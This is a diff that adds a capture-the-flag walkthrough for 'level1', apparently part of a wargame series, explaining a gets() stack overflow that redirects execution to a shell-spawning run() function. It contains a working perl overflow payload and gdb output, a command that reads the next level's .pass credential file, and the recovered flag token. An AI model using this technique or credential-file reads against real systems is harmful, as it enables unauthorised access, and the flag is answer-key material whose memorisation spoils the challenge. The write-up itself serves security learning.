@@ -1,0 +1,48 @@
+**Level1 Walkthrough**
+
+**Overview**
+- **Summary**: A concise buffer overflow write-up for `level1` based on the vulnerable `gets()` call and the return address overwrite that redirects execution to `run()`.
+
+**Decompiled Source**
+- See [source](source.c) for the decompiled source.
+
+**Analysis**
+- The program allocates a 76-byte buffer and uses `gets()` to read input.
+- `gets()` has no bounds checking, so input longer than 76 bytes overflows the buffer and overwrites the saved return address.
+- The saved return address controls `EIP` when `main()` returns.
+- By overwriting that address with the address of `run()`, execution is redirected to the function that spawns a shell.
+- The address used is `0x08048444`, written in little-endian as `\x44\x84\x04\x08`.
+
+**Get the run() func address**
+- **using gdb**:
+```sh
+(gdb) info functions run
+All functions matching regular expression "run":
+
+Non-debugging symbols:
+0x08048444  run
+
+```
+**Reproduction**
+- **Payload**:
+
+```sh
+perl -e 'print "A"x76 . "\x44\x84\x04\x08"' | ./level1
+```
+
+- **What happens**: The first 76 bytes fill the buffer, and the next 4 bytes overwrite the return address. When `main()` returns, the CPU jumps to `run()`.
+
+**Result**
+- The binary executes `run()`, prints the message, and spawns a shell.
+- From the shell:
+
+```sh
+whoami
+cat /home/user/level2/.pass
+```
+
+- **Recovered token**:
+
+```text
+53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
+```
